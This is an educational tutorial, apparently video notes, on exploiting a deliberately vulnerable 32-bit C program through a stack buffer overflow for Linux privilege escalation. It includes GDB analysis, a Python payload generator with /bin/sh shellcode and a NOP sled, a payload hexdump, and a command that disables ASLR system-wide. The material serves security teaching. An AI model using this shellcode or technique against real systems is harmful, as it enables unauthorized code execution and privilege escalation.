                      ____________________________

                       LINUX PRIVILEGE ESCALATION
                         Linux Binary Exploits

                            Leonardo Tamiano
                      ____________________________


Table of Contents
_________________

1. Buffer Overflow
2. Assumptions
3. Analysis with GDB
4. Exploitation
.. 1. Generation of Payload
.. 2. Final Payload
5. Takeways


1 Buffer Overflow
=================

  Consider the following C program

  ,----
  | #include <stdio.h>
  | #include <stdlib.h>
  | #include <string.h>
  | 
  | void vulnerable(char *input) {
  |   char buffer[512];
  |   strcpy(buffer,input);  
  | }
  | 
  | void main(int argc, char *argv[]) {
  |   if (argc > 1) {
  |     vulnerable(argv[1]);
  |   }  
  | }
  `----

  compile it with
  ,----
  | gcc -g -fno-stack-protector -z execstack -m32 vulnerable.c -o vulnerable
  `----

  and execute it
  ,----
  | $ ./vulnerable AAAA
  `----

  Is this this program safe?

  ----------------------------------------------------------------------

  No, it is not.

  The program suffers from a very well known memory corruption bug.

  You can see the consequences by giving it in input more than 512 As

  ,----
  | $ ./vulnerable AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  | Segmentation fault
  `----

  Such programs can be used to perform privilege escalation.


2 Assumptions
=============

  In this video we will analyze a very simple exploit.

  This is because we assume to be working in a very simple model that
  does not have modern protection for memory corruption such as:

  - non executable stack
  - no canary value
  - 32 bit architecture
  - no ASLR

  These protections and configuration can be removed and set during
  compilation.

  ,----
  | gcc -g -fno-stack-protector -z execstack -m32 vulnerable.c -o vulnerable
  `----

  Specifically,

  - `-g' to enable debug options
  - `-fno-stack-protector' to remove canary protection
  - `-z execstack' to make the stack executable
  - `-m32' to compile as 32 bit binary

  While for the ASLR configuration, you can disable it by writing into a
  kernel file as follows

  ,----
  | echo 0 > /proc/sys/kernel/randomize_va_space 
  `----

  While the basic idea behind `binary exploitation' does not change, the
  ways in which it is performed nowadays is drastically different, as
  one has to deal with all these new protections and counter-measures.


3 Analysis with GDB
===================

  List out functions
  ,----
  | (gdb) info functions
  | All defined functions:
  | 
  | File vulnerable.c:
  | 13:     void main(int, char **);
  | 8:      void vulnerable(char *);
  `----

  With GDB we can checkout the code for `main'

  ,----
  | (gdb) disass main
  | Dump of assembler code for function main:
  |    0x000011be <+0>:     lea    ecx,[esp+0x4]
  |    0x000011c2 <+4>:     and    esp,0xfffffff0
  |    0x000011c5 <+7>:     push   DWORD PTR [ecx-0x4]
  |    0x000011c8 <+10>:    push   ebp
  |    0x000011c9 <+11>:    mov    ebp,esp
  |    0x000011cb <+13>:    push   ecx
  |    0x000011cc <+14>:    sub    esp,0x4
  |    0x000011cf <+17>:    call   0x11fd <__x86.get_pc_thunk.ax>
  |    0x000011d4 <+22>:    add    eax,0x2e20
  |    0x000011d9 <+27>:    mov    eax,ecx
  |    0x000011db <+29>:    cmp    DWORD PTR [eax],0x1
  |    0x000011de <+32>:    jle    0x11f4 <main+54>
  |    0x000011e0 <+34>:    mov    eax,DWORD PTR [eax+0x4]
  |    0x000011e3 <+37>:    add    eax,0x4
  |    0x000011e6 <+40>:    mov    eax,DWORD PTR [eax]
  |    0x000011e8 <+42>:    sub    esp,0xc
  |    0x000011eb <+45>:    push   eax
  |    0x000011ec <+46>:    call   0x118d <vulnerable>
  |    0x000011f1 <+51>:    add    esp,0x10
  |    0x000011f4 <+54>:    nop
  |    0x000011f5 <+55>:    mov    ecx,DWORD PTR [ebp-0x4]
  |    0x000011f8 <+58>:    leave
  |    0x000011f9 <+59>:    lea    esp,[ecx-0x4]
  |    0x000011fc <+62>:    ret
  | End of assembler dump.
  `----

  and for `vulnearble'

  ,----
  | (gdb) disass vulnerable
  | Dump of assembler code for function vulnerable:
  |    0x0000118d <+0>:     push   ebp
  |    0x0000118e <+1>:     mov    ebp,esp
  |    0x00001190 <+3>:     push   ebx
  |    0x00001191 <+4>:     sub    esp,0x204
  |    0x00001197 <+10>:    call   0x11fd <__x86.get_pc_thunk.ax>
  |    0x0000119c <+15>:    add    eax,0x2e58
  |    0x000011a1 <+20>:    sub    esp,0x8
  |    0x000011a4 <+23>:    push   DWORD PTR [ebp+0x8]
  |    0x000011a7 <+26>:    lea    edx,[ebp-0x208]
  |    0x000011ad <+32>:    push   edx
  |    0x000011ae <+33>:    mov    ebx,eax
  |    0x000011b0 <+35>:    call   0x1040 <strcpy@plt>
  |    0x000011b5 <+40>:    add    esp,0x10
  |    0x000011b8 <+43>:    nop
  |    0x000011b9 <+44>:    mov    ebx,DWORD PTR [ebp-0x4]
  |    0x000011bc <+47>:    leave
  |    0x000011bd <+48>:    ret
  | End of assembler dump.
  `----

  Let's put a breakpoint before the call to `strcpy',

  ,----
  | (gdb) b *vulnerable+35 
  | Breakpoint 1 at 0x11b0: file vulnerable.c, line 10.
  `----

  we can now run the program some simple string until we hit the
  breakpoint

  ,----
  | (gdb) run AAAABBBBCCCCDDDD
  | Starting program: /home/leo/wa/tmp/bof/vulnerable AAAABBBBCCCCDDDD
  | warning: opening /proc/self/mem file failed: Permission denied (13)
  | [Thread debugging using libthread_db enabled]
  | Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  | 
  | Breakpoint 1, 0x565561b0 in vulnerable (input=0xffffdb3d "AAAABBBBCCCCDDDD") at vulnerable.c:10
  | 10        strcpy(buffer,input);  
  `----

  at this point we can check the state of the stack before the call to
  `strcpy'

  ,----
  | (gdb) x/10wx $esp
  | 0xffffd680:     0xffffd690      0xffffdb3d      0x00000000      0x5655619c
  | 0xffffd690:     0x00000000      0x00000000      0x00000000      0x00000000
  | 0xffffd6a0:     0x00000000      0x000000c5
  `----

  then we can go to the next instruction and check the stack after the
  call to `strcpy'

  ,----
  | (gdb) ni
  | 0x565561b5      10        strcpy(buffer,input);  
  | (gdb) x/10wx $esp
  | 0xffffd680:     0xffffd690      0xffffdb3d      0x00000000      0x5655619c
  | 0xffffd690:     0x41414141      0x42424242      0x43434343      0x44444444
  | 0xffffd6a0:     0x00000000      0x000000c5
  `----

  notice that the address we start writing in is 0xffffd690.

  ----------------------------------------------------------------------

  If we zoom out in the stack frame enough, we will see saved somewhere
  the saved return address, which should be the value 0x565561f1, as can
  be seen when disassembly the main. This is the address control flow
  will return to after it is done with the vulnerable function.

  ,----
  | (gdb) disass main
  | Dump of assembler code for function main:
  |    0x565561be <+0>:     lea    ecx,[esp+0x4]
  |    0x565561c2 <+4>:     and    esp,0xfffffff0
  |    0x565561c5 <+7>:     push   DWORD PTR [ecx-0x4]
  |    0x565561c8 <+10>:    push   ebp
  |    0x565561c9 <+11>:    mov    ebp,esp
  |    0x565561cb <+13>:    push   ecx
  |    0x565561cc <+14>:    sub    esp,0x4
  |    0x565561cf <+17>:    call   0x565561fd <__x86.get_pc_thunk.ax>
  |    0x565561d4 <+22>:    add    eax,0x2e20
  |    0x565561d9 <+27>:    mov    eax,ecx
  |    0x565561db <+29>:    cmp    DWORD PTR [eax],0x1
  |    0x565561de <+32>:    jle    0x565561f4 <main+54>
  |    0x565561e0 <+34>:    mov    eax,DWORD PTR [eax+0x4]
  |    0x565561e3 <+37>:    add    eax,0x4
  |    0x565561e6 <+40>:    mov    eax,DWORD PTR [eax]
  |    0x565561e8 <+42>:    sub    esp,0xc
  |    0x565561eb <+45>:    push   eax
  |    0x565561ec <+46>:    call   0x5655618d <vulnerable>
  |    0x565561f1 <+51>:    add    esp,0x10
  |    0x565561f4 <+54>:    nop
  |    0x565561f5 <+55>:    mov    ecx,DWORD PTR [ebp-0x4]
  |    0x565561f8 <+58>:    leave
  |    0x565561f9 <+59>:    lea    esp,[ecx-0x4]
  |    0x565561fc <+62>:    ret
  | End of assembler dump.
  `----

  If we read enough bytes from the stack frame we see the saved return
  at address at address 0xffffd89c

  ,----
  | (gdb) x/136wx $esp
  | 0xffffd680:     0xffffd690      0xffffdb3d      0x00000000      0x5655619c
  | 0xffffd690:     0x41414141      0x42424242      0x43434343      0x44444444
  | 0xffffd6a0:     0x00000000      0x000000c5      0xffffd70f      0xf7ffcfd8
  | 0xffffd6b0:     0x00000000      0x00000000      0x00000000      0x00000001
  | 0xffffd6c0:     0xffffd70f      0xffffd70e      0x000000c5      0xf7fdf0a1
  | 0xffffd6d0:     0x00000000      0x00000000      0x00000800      0x00000000
  | 0xffffd6e0:     0x00000001      0xffffffff      0x00000000      0x00000000
  | 0xffffd6f0:     0x00000001      0x00000001      0xffffebe8      0x00000019
  | 0xffffd700:     0xf7ffcfd8      0xffffd7a8      0xffffd7b8      0x00008000
  | 0xffffd710:     0xf7ffcfd8      0x01000000      0xffffd7b8      0xf7fdfbef
  | 0xffffd720:     0x00000019      0xffffd7b8      0xf7fe3020      0xffffd7b0
  | 0xffffd730:     0x00000000      0x00000000      0x00000000      0xffffd7b0
  | 0xffffd740:     0x00000800      0x01000000      0x00200000      0x00000800
  | 0xffffd750:     0x00c00000      0xf7fd3734      0xf7d9d823      0x565552e4
  | 0xffffd760:     0x00000000      0x00008000      0x00000040      0x00008000
  | 0xffffd770:     0x00000008      0xf7ffcfd8      0x00200000      0x00000008
  | 0xffffd780:     0x00000040      0xf7fc2410      0xf7d87a80      0xf7d8515c
  | 0xffffd790:     0xf63d4e2e      0xf7fd3b09      0x00000001      0x00000001
  | 0xffffd7a0:     0xf7d8a7b0      0x000002d3      0xf7d94c40      0xf7fc2410
  | 0xffffd7b0:     0xffffd814      0xffffd810      0x00000000      0x00000000
  | 0xffffd7c0:     0x00000000      0x00000003      0x00000000      0xf7d87a80
  | 0xffffd7d0:     0xf7ffcfd8      0xf7d94c40      0x5655529c      0xffffd810
  | 0xffffd7e0:     0xf63d4e2e      0x07b1ea71      0x0000000e      0xffffd8a0
  | 0xffffd7f0:     0xffffd814      0xf7fc2700      0x0000000b      0x56556060
  | 0xffffd800:     0x00000000      0x00000000      0x00000000      0x56555034
  | 0xffffd810:     0x00000000      0x00000000      0x00001000      0xf7fca000
  | 0xffffd820:     0x00000000      0xf63d4e2e      0xf7ffdc08      0xffffd8a0
  | 0xffffd830:     0xffffd8a4      0xf7fd42ce      0x5655521c      0xffffd8a4
  | 0xffffd840:     0xf7ffdb9c      0x00000001      0xf7fc2730      0x00000001
  | 0xffffd850:     0x00000000      0x00000001      0xf7ffda30      0x00000000
  | 0xffffd860:     0x00000000      0xffffdafb      0x00000000      0x0000001c
  | 0xffffd870:     0xf7ffcfd8      0x00000028      0x00000000      0xffffdfd8
  | 0xffffd880:     0xf7fc8570      0xf7fc8000      0x00000000      0x00000000
  | 0xffffd890:     0x00000000      0xf7fa1e34      0xffffd8b8      0x565561f1
  `----

  This means that in total there are 524 bytes of space between where we
  start to write the buffer and where the return address is saved.

  ,----
  | (gdb) p/d 0xffffd89c - 0xffffd690
  | $1 = 524
  `----


4 Exploitation
==============

  The idea behind exploitation is to use a NOP sled with a malicious
  shellcode which, when executed by the CPU, will trigger a `/bin/sh'
  shell.

  In particular, we want to put into the stack the following structure,
  where NOP is a simple `\x90' instruction which does nothing but
  increments the PC (Program Counter), while the new return address
  should point to the created NOP sled.

  ,----
  |          Low address
  |          -----------
  |             .
  |             .
  |             .
  | ESP ---> NOP SLED
  |          NOP SLED <-------------
  |          NOP SLED              |
  |          NOP SLED              |
  |          NOP SLED              |
  |          shellcode             |
  |          shellcode             |
  |          shellcode             |
  |          new return address ----
  |          new return address
  |          new return address
  |              .
  |              .
  |              .
  |          ------------
  |          High address
  `----

  With this setup, when the function returns from `vulnerable', we will
  jump into the NOP SLED, which will guide the CPU towards the
  shellcode. As soon as the shellcode is executed, we have our shell.


4.1 Generation of Payload
~~~~~~~~~~~~~~~~~~~~~~~~~

  The following python script can be used to generate a malicious input
  that is able to hijack the control flow of the application in order to
  execute a shell.

  ,----
  | #!/usr/bin/env python2.7
  | 
  | from struct import *
  | import sys
  | 
  | def main():
  |     shellcode = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b'
  |     shellcode += b'\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd'
  |     shellcode += b'\x80\xe8\xdc\xff\xff\xff/bin/sh'
  | 
  |     offset = 524
  |     return_addr_padding = 30
  | 
  |     # this is obtained in a very naive way using GDB on the
  |     # binary. This only works because we have disabled ASLR.
  |     return_addr = "0xffffd4e0"
  | 
  |     buf = b''
  | 
  |     # first, we write the NOP sled
  |     buf += b'\x90' * (offset - len(shellcode) - return_addr_padding)
  | 
  |     # then, the malicious shellcode
  |     buf += shellcode
  |     
  |     # make sure the new return address value is properly aligned in memory
  |     buf += "\x90" * (4 - (len(buf) % 4))
  | 
  |     # finally, the new return address
  |     buf += pack("I", int(return_addr, 16)) * (return_addr_padding)
  | 
  |     with open("payload.bin", "wb") as f:
  |         f.write(buf)
  | 
  | # ----------------------------------
  |         
  | if __name__ == "__main__":
  |     main()
  | 
  `----

  To use it, simply generate the malicious input and then call the
  program with such input

  ,----
  | leo@ctf:~/wa/tmp/bof$ python2.7 gen_payload.py 
  | leo@ctf:~/wa/tmp/bof$ ./vulnerable $(cat payload.bin)
  | $ whoami
  | leo
  `----


4.2 Final Payload
~~~~~~~~~~~~~~~~~

  The final payload has the following structure

  ,----
  | leo@ctf:~/wa/tmp/bof$ hexdump -vC payload.bin 
  | 00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000010  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000020  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000030  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000040  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000050  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000060  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000070  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000080  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000090  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000000a0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000000b0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000000c0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000000d0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000000e0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000000f0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000100  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000110  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000120  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000130  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000140  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000150  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000160  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000170  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000180  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 00000190  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000001a0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000001b0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
  | 000001c0  90 eb 1f 5e 89 76 08 31  c0 88 46 07 89 46 0c b0  |...^.v.1..F..F..|
  | 000001d0  0b 89 f3 8d 4e 08 8d 56  0c cd 80 31 db 89 d8 40  |....N..V...1...@|
  | 000001e0  cd 80 e8 dc ff ff ff 2f  62 69 6e 2f 73 68 90 90  |......./bin/sh..|
  | 000001f0  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000200  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000210  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000220  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000230  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000240  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000250  e0 d4 ff ff e0 d4 ff ff  e0 d4 ff ff e0 d4 ff ff  |................|
  | 00000260  e0 d4 ff ff e0 d4 ff ff                           |........|
  | 00000268
  `----


5 Takeways
==========

  While the binary exploit shown is extremly simple, the same idea can
  be applied to modern binaries with all the latest protections. All
  these protections can be bypass with appropriate techniques and
  primitives.

  The biggest takeway is that sometimes the binaries present in a system
  can be vulnerable to binary exploitation. This, in turn, can make it
  possible to hijack the execution flow of the binary in order to
  execute arbitrary code, including malicious code.

  Thus, exploitation of `userspace programs' can also be a path towards
  privilege escalation.
